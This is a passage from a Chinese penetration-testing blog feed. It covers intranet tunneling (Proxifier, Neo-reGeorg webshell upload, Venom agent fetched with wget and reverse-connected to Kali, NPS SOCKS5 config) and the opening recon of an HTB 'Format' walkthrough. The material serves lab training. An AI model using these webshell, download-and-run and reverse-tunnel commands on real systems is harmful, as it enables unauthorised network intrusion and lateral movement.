/etc/proxychains4.conf</code></pre><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230423092810-yg12a53.png" alt="image">​</p><p>验证成功性：</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230423092946-phli4gf.png" alt="image">​</p><h3 id="proxifier配置代理："><a href="#proxifier配置代理：" class="headerlink" title="proxifier配置代理："></a>proxifier配置代理：</h3><p>这里可以看到代理的IP和端口，账号和密码</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230423092859-h94udxf.png" alt="image">​</p><p>‍</p><p>根据搭建好的socks5代理，进行规则配置：</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605212304-lrmtgbv.png" alt="image">​</p><p>‍</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605213202-j0dyb2n.png" alt="image">​</p><p><strong>注意：配置全局代理有一些本地的应用将会失去网络连接，即断网</strong></p><p>配置代理服务器，配置完之后可以点击检查，看右边的如果测试通过则表示代理配置成功：</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230423092837-rykd9l5.png" alt="image">​</p><p>之后就是全局代理了，可以直接访问内网：</p><p>​​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230423101341-yzlf48t.png" alt="image">​​</p><p>当然了，这里也可以配置单个的应用代理，只需要在代理规则那里将想要代理的应用使用代理，任意应用采取direct策略即可</p><p>假设这里要设置远程桌面应用：</p><p>​​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605213532-a5szlza.png" alt="image">​​</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605213628-11908db.png" alt="image">​</p><p>测试访问情况：</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/0e76e707cca885d1066f04b8306e6d0a-20230605213647-fism7l8.png" alt="0e76e707cca885d1066f04b8306e6d0a">​</p><p>发现可以成功登陆</p><p>‍</p><h4 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h4><p>这里就算设置了proxifier的代理应用为全部好像还是利用不了fscan扫描，有点奇怪。可以单独给fscan设置一个应用代理。</p><h2 id="Neo-reGeorg代理"><a href="#Neo-reGeorg代理" class="headerlink" title="Neo-reGeorg代理"></a>Neo-reGeorg代理</h2><p>先生成我们需要的shell：</p><p>​<code>python neoreg.py generate -k qingfeng</code>​</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605214656-070k94a.png" alt="image">​</p><p>根据目标的web服务选择上传的shell文件</p><p>把neoreg_servers目录下面生成的php文件放到目标文件上。切记这里不要把templates目录下的php当成生成的恶意文件，那个只是模板，可以自己修改，想要修改可以参考<a href="https://www.cnblogs.com/zpchcbd/p/16609082.html%E8%BF%87%E5%85%8D%E6%9D%80%EF%BC%8C%60%E5%85%B6%E4%B8%AD%E6%9C%89%E4%B8%80%E4%B8%AA%E6%8A%8A%E5%9B%9E%E6%98%BE%E6%94%B9%E6%88%90404%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%9E%E6%8E%A5%E4%BD%BF%E7%94%A8--skip%E7%9A%84%E6%80%9D%E8%B7%AF%E8%BF%98%E6%8C%BA%E6%96%B0%E5%A5%87%E7%9A%84%EF%BC%8C%E5%80%BC%E5%BE%97%E5%8F%82%E8%80%83%60%E2%80%8B%E3%80%82%E8%BF%87%E8%BF%99%E4%B8%AA%E5%9D%91%E6%84%9F%E8%B0%A2qiu%E7%88%B7%E5%A5%BD%E9%AA%82%E3%80%82">https://www.cnblogs.com/zpchcbd/p/16609082.html过免杀，`其中有一个把回显改成404，然后连接使用--skip的思路还挺新奇的，值得参考`​。过这个坑感谢qiu爷好骂。</a></p><p>使用本机连接：</p><pre class=" language-bash"><code class="language-bash">python neoreg.py -u http://192.168.64.129/tunnel.php -k qingfeng -p 9999</code></pre><p>这里使用<code>SwitchyOmega</code>​演示:</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230606185905-fvd7d25.png" alt="image">​</p><p>访问试试看：</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230606190022-itlt6et.png" alt="image">​</p><p>有一个参数可以注意的就是，如果我们不指定<code>-l</code>​参数，他默认就是<code>127.0.0.1</code>​。这种情况下这个代理只能本机使用了，如果是使用命令：</p><pre class=" language-bash"><code class="language-bash">python neoreg.py -u http://192.168.64.129/tunnel.php -k qingfeng -p 9999 -l 192.168.64.1</code></pre><p>这样子指定一个别人能访问得到的ip，那么这个代理就可以供其他机器使用了</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230606190827-roj151a.png" alt="image">​</p><p>我们再kali上连接代理尝试访问：</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230606190931-36292wu.png" alt="image">​</p><p>发现是可以成功的</p><p>‍</p><h2 id="Venom代理"><a href="#Venom代理" class="headerlink" title="Venom代理"></a><strong>Venom代理</strong></h2><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools<span class="token punctuation">]</span>└─<span class="token variable">$git</span> clone https://github.com/Dliv3/Venom</code></pre><p>安装好后进入目录编译一下：</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/Venom<span class="token punctuation">]</span>└─$ ./build.sh   build macos x64 admin <span class="token operator">&amp;</span> agent<span class="token punctuation">..</span>.go: downloading github.com/cheggaaa/pb/v3 v3.0.1go: downloading golang.org/x/crypto v0.0.0-20190911031432-227b76d455e7go: downloading github.com/libp2p/go-reuseport v0.0.1go: downloading github.com/fatih/color v1.7.0go: downloading github.com/VividCortex/ewma v1.1.1go: downloading github.com/mattn/go-colorable v0.1.2go: downloading github.com/mattn/go-isatty v0.0.8go: downloading github.com/mattn/go-runewidth v0.0.4go: downloading golang.org/x/sys v0.0.0-20190412213103-97732733099dbuild linux x64 admin <span class="token operator">&amp;</span> agent<span class="token punctuation">..</span>.build linux x86 admin <span class="token operator">&amp;</span> agent<span class="token punctuation">..</span>.build windows x86 admin <span class="token operator">&amp;</span> agent<span class="token punctuation">..</span>.build arm eabi5 agent<span class="token punctuation">..</span>.build mipsel agent<span class="token punctuation">..</span></code></pre><p>进入<code>release</code>​目录，本地开启一个<code>http</code>​服务供<code>docker</code>​下载客户端用于连接我们：</p><p>我们先看一下客户端docker的环境是多少位的内核版本多少：</p><pre class=" language-bash"><code class="language-bash">/app <span class="token comment" spellcheck="true"># cat /proc/version           </span>Linux version 3.13.0-24-generic <span class="token punctuation">(</span>buildd@panlong<span class="token punctuation">)</span> <span class="token punctuation">(</span>gcc version 4.8.2 <span class="token punctuation">(</span>Ubuntu 4.8.2-19ubuntu1<span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014</span>/app <span class="token comment" spellcheck="true"># uname -a</span>Linux 755411217bdd 3.13.0-24-generic <span class="token comment" spellcheck="true">#46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 Linux</span></code></pre><p>可以看到是64位的</p><p>‍</p><p>我们在<code>/Venom/release</code>​目录下面用<code>python</code>​开一个<code>web</code>​服务:</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/Venom/release<span class="token punctuation">]</span>└─$ python -m http.server 8888Serving HTTP on 0.0.0.0 port 8888 <span class="token punctuation">(</span>http://0.0.0.0:8888/<span class="token punctuation">)</span> <span class="token punctuation">..</span>.</code></pre><p>然后在目标靶机上下载客户端：</p><pre class=" language-bash"><code class="language-bash">/app <span class="token comment" spellcheck="true"># wget 192.168.64.128:8888/agent_linux_x64</span>Connecting to 192.168.64.128:8888 <span class="token punctuation">(</span>192.168.64.128:8888<span class="token punctuation">)</span>agent_linux_x64      100% <span class="token operator">|</span>*******************************<span class="token operator">|</span>  3564k  0:00:00 ETA</code></pre><p>‍</p><p>kali开启监听端口：</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/Venom/release<span class="token punctuation">]</span>└─$ ./admin_linux_x64 -lport 2333 Venom Admin Node Start<span class="token punctuation">..</span>.                                                                            ██▒   █▓█████ ███▄    █ ▒█████  ███▄ ▄███▓                            ▓██░   █▓█   ▀ ██ ▀█   █▒██▒  ██▓██▒▀█▀ ██▒                             ▓██  █▒▒███  ▓██  ▀█ ██▒██░  ██▓██    ▓██░                              ▒██ █░▒▓█  ▄▓██▒  ▐▌██▒██   ██▒██    ▒██                                ▒▀█░ ░▒████▒██░   ▓██░ ████▓▒▒██▒   ░██▒                               ░ ▐░ ░░ ▒░ ░ ▒░   ▒ ▒░ ▒░▒░▒░░ ▒░   ░  ░                               ░ ░░  ░ ░  ░ ░░   ░ ▒░ ░ ▒ ▒░░  ░      ░                                 ░░    ░     ░   ░ ░░ ░ ░ ▒ ░      ░                                     ░    ░  ░        ░    ░ ░        ░                                    ░                                                                            <span class="token punctuation">{</span> v1.1 author: Dlive <span class="token punctuation">}</span> </code></pre><p>目标机连接kali：</p><pre class=" language-bash"><code class="language-bash">/app <span class="token comment" spellcheck="true"># ./agent_linux_x64 -rhost 192.168.64.128 -rport 2333</span>./agent_linux_x64 -rhost 192.168.64.128 -rport 23332023/06/01 06:45:18 <span class="token punctuation">[</span>+<span class="token punctuation">]</span>Successfully connects to a new node</code></pre><p>连接成功后可以用show查看连接的情况：</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230601192857-7d55eso.png" alt="image">​</p><p>我们可以利用<code>goto 1</code>​进入该节点</p><p>可以利用该节点搭建<code>socket5</code>​代理</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230601193058-hd3jrd8.png" alt="image">​</p><p>接着利用本机的<code>kali</code>​的<code>proxychains</code>​来连接这个<code>socket</code>​代理</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面<span class="token punctuation">]</span>└─$ <span class="token function">sudo</span> gedit /etc/proxychains4.conf</code></pre><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230601193233-jy5kae1.png" alt="image">​</p><p>配置好代理就可以开始内网信息收集了</p><p>‍</p><h2 id="NPS代理"><a href="#NPS代理" class="headerlink" title="NPS代理"></a>NPS代理</h2><p>‍</p><p>nps_server.conf的配置文件：</p><pre class=" language-xml"><code class="language-xml">appname = nps#Boot mode(dev|pro)#启动模式runmode = dev#HTTP(S) proxy port, no startup if empty#HTTP(S)代理端口，如果为空则不启动http_proxy_ip=0.0.0.0http_proxy_port=8081   #http监听端口，默认80https_proxy_port=443https_just_proxy=true#default https certificate setting#默认HTTPS证书设置https_default_cert_file=conf/server.pemhttps_default_key_file=conf/server.key##bridge##桥接bridge_type=tcpbridge_port=8024##客户端与服务端连接端口bridge_ip=0.0.0.0## Public password, which clients can use to connect to the server## 公共密码，客户端可以使用它连接到服务器## After the connection, the server will be able to open relevant ports and parse related domain names according to its own configuration file.## 连接完成后，服务器就可以打开相关端口，根据自己的配置文件解析相关域名。public_vkey=123#Traffic data persistence interval(minute)#流量数据持续时间间隔(分钟)#Ignorance means no persistence#flow_store_interval=1## log level LevelEmergency->0  LevelAlert->1 LevelCritical->2 LevelError->3 LevelWarning->4 LevelNotice->5 LevelInformational->6 LevelDebug->7## 日志等级设置log_level=7#log_path=nps.log#Whether to restrict IP access, true or false or ignore#是否限制IP访问，true、false或ignore#ip_limit=true#p2p代理#p2p_ip=127.0.0.1#p2p_port=6000#webweb_host=##web管理端登录地址URLweb_username=admin##web管理端登录名web_password=123##web管理端登录密码（注：正式环境建议更改）web_port = 8080##web管理端访问端口web_ip=0.0.0.0##web管理端登录地址默认0.0.0.0不需要修改web_base_url=##管理端web路径，默认不需要指定web_open_ssl=false#管理端是否开启sslweb_cert_file=conf/server.pemweb_key_file=conf/server.key## if web under proxy use sub path. like http://host/nps need this.#web_base_url=/nps#Web API unauthenticated IP address(the len of auth_crypt_key must be 16)#Remove comments if needed#auth_key=testauth_crypt_key =1234567812345678#allow_ports=9001-9009,10001,11000-12000#Web management multi-user login#Web管理多用户登录allow_user_login=falseallow_user_register=falseallow_user_change_username=false#extensionallow_flow_limit=falseallow_rate_limit=falseallow_tunnel_num_limit=falseallow_local_proxy=falseallow_connection_num_limit=falseallow_multi_ip=falsesystem_info_display=false#cachehttp_cache=falsehttp_cache_length=100#get origin iphttp_add_origin_header=false#pprof debug options#pprof_ip=0.0.0.0#pprof_port=9999#client disconnect timeout#客户端断开连接超时disconnect_timeout=60</code></pre><p>然后用命令<code>./nps</code>​开启服务</p><p>‍</p><p>访问<code>vps_ip:vps_port</code>​</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605092440-yo0xivz.png" alt="image">​</p><p>登陆，创建一个客户端连接：</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605092542-1zhcg95.png" alt="image">​</p><p>配置好选项：</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605092728-d4b3yxn.png" alt="image">​</p><p>上图分别对应客户端这三个配置：</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605092840-t69a7i2.png" alt="image">​</p><p><strong>！！这里的</strong>​<code>**basic_username**</code>​<strong>和</strong>​<code>**basic_password**</code>​<strong>也是后续使用socks5代理要配置的账号密码！！</strong></p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605093028-5qdy9sy.png" alt="image">​</p><p>然后配置服务器端口，就是socks5的端口，这里选择8888，默认是8003</p><p>​​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605152743-k64izeb.png" alt="image">​​</p><p>‍</p><p>客户端连接的命令：</p><pre class=" language-bash"><code class="language-bash"> ./npc -server<span class="token operator">=</span>123.249.8.26:8024 -vkey<span class="token operator">=</span>12345 -type<span class="token operator">=</span>tcp</code></pre><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605093311-nfddn4o.png" alt="image">​</p><p>连接成功后的显示就是这样</p><p>‍</p><p>可以利用<a href="moz-extension://2e4a675b-9830-4fa5-b674-aded830c42cd/options.html#!/about" title="关于">SwitchyOmega</a>来验证一下连接的成功性：</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605093406-srqmv51.png" alt="image">​</p><p>然后点击那个锁配置密码：</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605093456-o0h2icg.png" alt="image">​</p><p>‍</p><p>访问一下内网地址，发现成功访问，即为穿透成功</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605152723-y8e0dv7.png" alt="image">​</p><p>‍</p><h2 id="内网机器不出网如何搭建隧道"><a href="#内网机器不出网如何搭建隧道" class="headerlink" title="内网机器不出网如何搭建隧道"></a>内网机器不出网如何搭建隧道</h2><p>我们来看一下连接的拓扑图是如何的</p><p>​​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605160108-f6213a1.png" alt="image">​​</p><p>这里就是通过socks5代理以vps为服务端，内网机器1为客户端达到内网穿透访问内网机器.这种利用VPS的场景更常见于拿下了公网的服务器，想要进一步渗透内网机器。</p><p>首先通过这个拓扑图我们要明白：</p><pre class=" language-xml"><code class="language-xml">穿透是指穿透客户端相关整个网段的机器</code></pre><p>如何理解呢？</p><ol><li>如果我们要穿透10网段的地址，需要把客户端放在我们可以访问的10网段。就如上图的内网机器1，因为他同时拥有192的网段和10的网段，利用他我们就可以达到穿透10网段的目的。</li><li>如果再有10地址的机器，如<code>10.10.11.200</code>​、<code>10.10.11.215</code>​等等我们都可以利用这个搭建好的隧道访问到</li><li>要和服务端区别开，服务端只是双方均可访问到的桥梁，并不能作为内网穿透的目标网段。简单而言就是你本机是访问不到vps中转服务端的内网地址的。</li></ol><p>其次我们可以屏蔽中间人的请求，直接对内网机器2发送请求。那么这个中间人是否可以再操作？</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605161532-v7mwcyg.png" alt="image">​</p><p>可以注意到，我们其实和内网机器1是在同一个网段的，所以我们可以摒弃VPS中转服务端。直接利用内网机器1进行流量代理，所以可以直接把内网机器1当作服务端和客户端，自己连接自己。我们通过建立的socks5代理达到内网穿透的目的。</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605160613-26u86es.png" alt="image">​</p><p>我们通过连接好的socks5代理，试试看内网穿透能否成功;</p><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605160715-gbghvn8.png" alt="image">​</p><p>可以看到成功达到内网穿透</p><p>那么这种方法有何意义或者作用呢？</p><p>在某次实战中有这样一个问题：</p><p>现在已经拿下了内网机器机器1，想要继续访问内网机器2。但是内网机器1他不出网，而且没有web服务。</p><p>确实可以利用MSF正向的方法，建立连接，然后使用route配置路由访问。当时不会这一条路，建立了正向连接无法访问内网机器2的web服务，无法进行下一步渗透。</p><p>此时想要建立隧道就可以使用上述方法，把内网机器1同时当作客户端和服务端我们就可以内网穿透达到访问内网机器2的目的。</p><p>‍</p><p>‍</p><p>关于MSF的内网利用和CS的内网利用后续更新…</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HTB_Format</title>
      <link href="/2023/06/04/HTB%20Format/"/>
      <url>/2023/06/04/HTB%20Format/</url>
      
        <content type="html"><![CDATA[<h1 id="HTB-Format"><a href="#HTB-Format" class="headerlink" title="HTB Format"></a>HTB Format</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先添加域名解析到<code>/etc/hosts</code>​</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/Venom/release<span class="token punctuation">]</span>└─$ <span class="token function">sudo</span> <span class="token keyword">echo</span> 10.10.11.213 <span class="token function">format</span> format.htb <span class="token operator">>></span> /etc/hosts</code></pre><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/Venom/release<span class="token punctuation">]</span>└─$ <span class="token function">sudo</span> nmap --min-rate 10000 -p- 10.10.11.213<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> kali 的密码：Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-06-02 15:13 CSTWarning: 10.10.11.213 giving up on port because retransmission cap hit <span class="token punctuation">(</span>10<span class="token punctuation">)</span>.Nmap scan report <span class="token keyword">for</span> bogon <span class="token punctuation">(</span>10.10.11.213<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0.47s latency<span class="token punctuation">)</span>.Not shown: 62147 closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>, 3385 filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>PORT     STATE SERVICE22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>80/tcp   <span class="token function">open</span>  http3000/tcp <span class="token function">open</span>  pppNmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 33.59 seconds</code></pre><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/fscan<span class="token punctuation">]</span>└─$ ./fscan -h 10.10.11.213   ___                              _    / _ \     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __  / /_\/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ // /_\\_____\__ \ <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>  \____/     <span class="token operator">|</span>___/\___<span class="token operator">|</span>_<span class="token operator">|</span>  \__,_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>\_\                        fscan version: 1.8.2start infoscantrying RunIcmp2The current user permissions unable to send icmp packetsstart <span class="token function">ping</span><span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target 10.10.11.213    is alive<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Icmp alive hosts len is: 110.10.11.213:22 <span class="token function">open</span>Open result.txt error, <span class="token function">open</span> result.txt: permission denied10.10.11.213:80 <span class="token function">open</span>Open result.txt error, <span class="token function">open</span> result.txt: permission denied10.10.11.213:3000 <span class="token function">open</span>Open result.txt error, <span class="token function">open</span> result.txt: permission denied<span class="token punctuation">[</span>*<span class="token punctuation">]</span> alive ports len is: 3start vulscan<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle: http://10.10.11.213       code:200 len:135    title:NoneOpen result.txt error, <span class="token function">open</span> result.txt: permission denied<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle: http://10.10.11.213:3000  code:301 len:169    title:301 Moved Permanently 跳转url: http://microblog.htb:3000/Open result.txt error, <span class="token function">open</span> result.txt: permission denied</code></pre><p>扫描完端口再对端口进行详细的信息收集：</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/Venom/release<span class="token punctuation">]</span>└─$ <span class="token function">sudo</span> nmap -sT -sV -O -p 22,80,3000 <span class="token function">format</span>  Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-06-02 15:17 CSTNmap scan report <span class="token keyword">for</span> <span class="token function">format</span> <span class="token punctuation">(</span>10.10.11.213<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0.35s latency<span class="token punctuation">)</span>.PORT     STATE SERVICE VERSION22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH 8.4p1 Debian 5+deb11u1 <span class="token punctuation">(</span>protocol 2.0<span class="token punctuation">)</span>80/tcp   <span class="token function">open</span>  http    nginx 1.18.03000/tcp <span class="token function">open</span>  http    nginx 1.18.0Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least 1 <span class="token function">open</span> and 1 closed portAggressive OS guesses: Linux 5.0 <span class="token punctuation">(</span>96%<span class="token punctuation">)</span>, Linux 4.15 - 5.6 <span class="token punctuation">(</span>95%<span class="token punctuation">)</span>, Linux 5.3 - 5.4 <span class="token punctuation">(</span>95%<span class="token punctuation">)</span>, Linux 2.6.32 <span class="token punctuation">(</span>95%<span class="token punctuation">)</span>, Linux 5.0 - 5.3 <span class="token punctuation">(</span>95%<span class="token punctuation">)</span>, Linux 3.1 <span class="token punctuation">(</span>95%<span class="token punctuation">)</span>, Linux 3.2 <span class="token punctuation">(</span>95%<span class="token punctuation">)</span>, AXIS 210A or 211 Network Camera <span class="token punctuation">(</span>Linux 2.6.17<span class="token punctuation">)</span> <span class="token punctuation">(</span>94%<span class="token punctuation">)</span>, ASUS RT-N56U WAP <span class="token punctuation">(</span>Linux 3.4<span class="token punctuation">)</span> <span class="token punctuation">(</span>93%<span class="token punctuation">)</span>, Linux 3.16 <span class="token punctuation">(</span>93%<span class="token punctuation">)</span>No exact OS matches <span class="token keyword">for</span> host <span class="token punctuation">(</span>test conditions non-ideal<span class="token punctuation">)</span>.Network Distance: 2 hopsService Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 23.70 seconds</code></pre><p>‍</p><p>访问<code>http://format.htb</code>​后,发现它跳转子域名了：<code>http://app.microblog.htb</code>​</p><p>所以我们再添加一个域名解析到<code>/etc/hosts</code>​</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/Venom/release<span class="token punctuation">]</span>└─$ <span class="token function">sudo</span> <span class="token keyword">echo</span> 10.10.11.213 app.format.htb <span class="token operator">>></span> /etc/hosts</code></pre><p>然后就可以接着访问了，我们注册一个账号：</p><p>​​<img src="/Blogimages/HTB_Format/image-20230602164424-ui5lvwp.png" alt="image">​​</p><p>注册完登陆就行了</p><p>然后我们随便创一个节点：</p><p>​<img src="/Blogimages/HTB_Format/image-20230602164538-99721bz.png" alt="image">​</p><p>‍</p><p>但是接下来找不到利用点了，F12看看有没有什么东西</p><pre class=" language-js"><code class="language-js"><span class="token function">$</span><span class="token punctuation">(</span>window<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//populate from DB</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".user-first-name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">"Qingfeng"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> sites <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"qingfeng"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>sites<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".my-blogs-outer"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">"No blogs found... get blogging!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".empty-space-blogs"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">"min-height"</span><span class="token punctuation">,</span> <span class="token string">"20px"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sites<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".my-blogs-outer"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`&lt;div class = "my-blogs-inner">&lt;div class = "my-blogs-name my-blogs-item">&lt;div class = "my-blogs-item-cell"></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>sites<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/div>&lt;/div>&lt;a href = "http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>sites<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.microblog.htb" class = "my-blogs-link my-blogs-item">&lt;div class = "my-blogs-item-cell">Visit Site&lt;/div>&lt;/a>&lt;a href = "http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>sites<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.microblog.htb/edit/" class = "my-blogs-link my-blogs-item">&lt;div class = "my-blogs-item-cell">Edit Site&lt;/div>&lt;/a>&lt;/div>`</span></span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">const</span> pro <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>pro<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token 